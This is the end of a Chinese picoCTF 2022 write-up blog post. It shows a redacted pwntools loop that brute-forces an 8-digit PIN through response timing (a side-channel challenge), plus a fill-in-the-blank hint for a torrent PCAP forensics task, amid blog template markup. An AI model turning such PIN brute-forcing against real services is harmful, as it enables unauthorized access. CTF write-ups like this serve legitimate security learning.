+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(xxxx,xxxx,xxxx):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = conn()</span><br><span class="line">        timenow = time.time()</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Please enter your 8-digit PIN code:&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Checking PIN...\n&quot;</span>)</span><br><span class="line">        result = io.recvline()</span><br><span class="line">        log.success(<span class="string">&quot;&#123;&#125;,required &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i,time.time()-timenow))</span><br><span class="line">    <span class="keyword">except</span> OSError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>大概的脚本如下，关键信息没放，自己破解吧哈哈哈</p>
+<h3 id="Torrent-Analyze"><a href="#Torrent-Analyze" class="headerlink" title="Torrent Analyze"></a>Torrent Analyze</h3><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.aneasystone.com/archives/2015/05/analyze-magnet-protocol-using-wireshark.html">https://www.aneasystone.com/archives/2015/05/analyze-magnet-protocol-using-wireshark.html</a></p>
+<p>我把思路放这儿了，自己填空啊哈哈哈哈</p>
+<blockquote>
+<p>PCAP文件首先过滤xxxx协议，简单看一看会发现xxxxx请求，里面有xxxx字段，xxxx是文件的xxx，复制放在迅雷里面就开始下载了</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">Retr0mous</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://retr0.blog/2022/03/21/pico22-writeup/">https://retr0.blog/2022/03/21/pico22-writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://retr0.blog" target="_blank">Retr0 's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwns/">Pwns</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/src=http___img2.doubanio.com_view_richtext_large_public_p190170482.jpg&amp;refer=http___img2.doubanio.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/03/11/Tcache-stuff/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/123.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Tcache_stuff</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/posts0c5201b6e89c8bbdd96b3f6033afa50a_q.jpg-1170x741" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Retr0mous</div><div class="author-info__description">一个无聊的12岁小朋友</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/DDizzy79"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/DDizzzy79" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/patrick_0429@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/qq.com" target="_blank" title="195509868"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Welcome To Ret2w1cky<div class="twopeople"></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Binary-Exploitation"><span class="toc-number">2.</span> <span class="toc-text">Binary Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-file-exp"><span class="toc-number">2.1.</span> <span class="toc-text">Basic-file exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-zero"><span class="toc-number">2.2.</span> <span class="toc-text">Buffer overflow zero</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-one"><span class="toc-number">2.3.</span> <span class="toc-text">Buffer overflow one</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-Two"><span class="toc-number">2.4.</span> <span class="toc-text">Buffer overflow Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buffer-overflow-Three"><span class="toc-number">2.5.</span> <span class="toc-text">buffer overflow Three</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RPS"><span class="toc-number">2.6.</span> <span class="toc-text">RPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-fu-amp-amp-Wine"><span class="toc-number">2.7.</span> <span class="toc-text">ROP-fu &amp;&amp; Wine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Function-Overwrite"><span class="toc-number">2.8.</span> <span class="toc-text">Function Overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-leak"><span class="toc-number">2.9.</span> <span class="toc-text">flag leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-cache"><span class="toc-number">2.10.</span> <span class="toc-text">stack cache</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">3.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SideChannel"><span class="toc-number">3.1.</span> <span class="toc-text">SideChannel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Torrent-Analyze"><span class="toc-number">3.1.1.</span> <span class="toc-text">Torrent Analyze</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/03/21/pico22-writeup/" title="pico22-writeup"><img src="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/src=http___img2.doubanio.com_view_richtext_large_public_p190170482.jpg&amp;refer=http___img2.doubanio.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pico22-writeup"/></a><div class="content"><a class="title" href="/2022/03/21/pico22-writeup/" title="pico22-writeup">pico22-writeup</a><time datetime="2022-03-21T12:58:15.000Z" title="发表于 2022-03-21 20:58:15">2022-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/11/Tcache-stuff/" title="Tcache_stuff"><img src="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/123.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tcache_stuff"/></a><div class="content"><a class="title" href="/2022/03/11/Tcache-stuff/" title="Tcache_stuff">Tcache_stuff</a><time datetime="2022-03-11T14:54:48.000Z" title="发表于 2022-03-11 22:54:48">2022-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/11/pico-filtered-shellcode/" title="pico-filtered-shellcode"><img src="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/20220211153358.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pico-filtered-shellcode"/></a><div class="content"><a class="title" href="/2022/02/11/pico-filtered-shellcode/" title="pico-filtered-shellcode">pico-filtered-shellcode</a><time datetime="2022-02-11T06:41:08.000Z" title="发表于 2022-02-11 14:41:08">2022-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/12/RV110W-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="RV110W 漏洞复现"><img src="https://i.loli.net/2021/11/13/EMFKf2AqgYy9CdH.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RV110W 漏洞复现"/></a><div class="content"><a class="title" href="/2021/11/12/RV110W-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="RV110W 漏洞复现">RV110W 漏洞复现</a><time datetime="2021-11-12T12:01:00.000Z" title="发表于 2021-11-12 20:01:00">2021-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/12/Retxx-%E8%A7%A3%E6%9E%90/" title="Retxx 解析"><img src="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/posts/微信图片_20211112161321.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Retxx 解析"/></a><div class="content"><a class="title" href="/2021/11/12/Retxx-%E8%A7%A3%E6%9E%90/" title="Retxx 解析">Retxx 解析</a><time datetime="2021-11-12T09:17:00.000Z" title="发表于 2021-11-12 17:17:00">2021-11-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/src=http___img2.doubanio.com_view_richtext_large_public_p190170482.jpg&amp;refer=http___img2.doubanio.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Retr0mous</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hello Welcome To Retr0 's blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'twikoo-5gcp9eau123f5c3b',
+      region: ''
+    }, null))
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: 'twikoo-5gcp9eau123f5c3b',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script async src="https://at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>
